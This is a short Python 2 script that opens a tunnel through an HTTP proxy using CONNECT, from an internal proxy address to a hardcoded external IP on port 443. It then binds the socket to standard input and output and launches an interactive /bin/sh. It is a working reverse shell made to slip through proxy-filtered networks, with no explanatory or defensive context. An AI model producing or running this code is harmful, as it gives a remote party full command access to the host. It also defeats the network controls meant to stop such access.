import socket, pty, os, subprocess
from base64 import b64encode

def http_proxy_connect(address, proxy = None, auth = None, headers = {}):
  
  def valid_address(addr):
    return isinstance(addr, (list, tuple)) and len(addr) == 2 and isinstance(addr[0], str) and isinstance(addr[1], (int, long))
  
  if not valid_address(address):
    raise ValueError('Invalid target address')
  
  if proxy == None:
    s = socket.socket()
    s.connect(address)
    return s, 0, {}
  
  if not valid_address(proxy):
    raise ValueError('Invalid proxy address')
  
  headers = {
    'host': address[0]
  }
  
  if auth != None:
    if isinstance(auth, str):
      headers['proxy-authorization'] = auth
    elif auth and isinstance(auth, (tuple, list)) and len(auth) == 2:
      headers['proxy-authorization'] = 'Basic ' + b64encode('%s:%s' % auth)
    else:
      raise ValueError('Invalid authentication specification')
  
  s = socket.socket()
  s.settimeout(None)
  s.connect(proxy)
  fp = s.makefile('r+')
  fp.write('CONNECT %s:%d HTTP/1.0\r\n' % address)
  fp.write('\r\n'.join('%s: %s' % (k, v) for (k, v) in headers.items()) + '\r\n\r\n')
  fp.flush()
  
  statusline = fp.readline().rstrip('\r\n')
  
  if statusline.count(' ') < 2:
    fp.close()
    s.close()
    raise IOError('Bad response')
  version, status, statusmsg = statusline.split(' ', 2)
  if not version in ('HTTP/1.0', 'HTTP/1.1'):
    fp.close()
    s.close()
    raise IOError('Unsupported HTTP version')
  try:
    status = int(status)
  except ValueError:
    fp.close()
    s.close()
    raise IOError('Bad response')
  
  response_headers = {}
  
  while True:
    tl = ''
    l = fp.readline().rstrip('\r\n')
    if l == '':
      break
    if not ':' in l:
      continue
    k, v = l.split(':', 1)
    response_headers[k.strip().lower()] = v.strip()
  
  fp.close()
  return (s, status, response_headers)
  
(s,b,c) = http_proxy_connect (("52.215.9.233", 443), ("172.21.200.40", 3128))
print b,c
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"]);
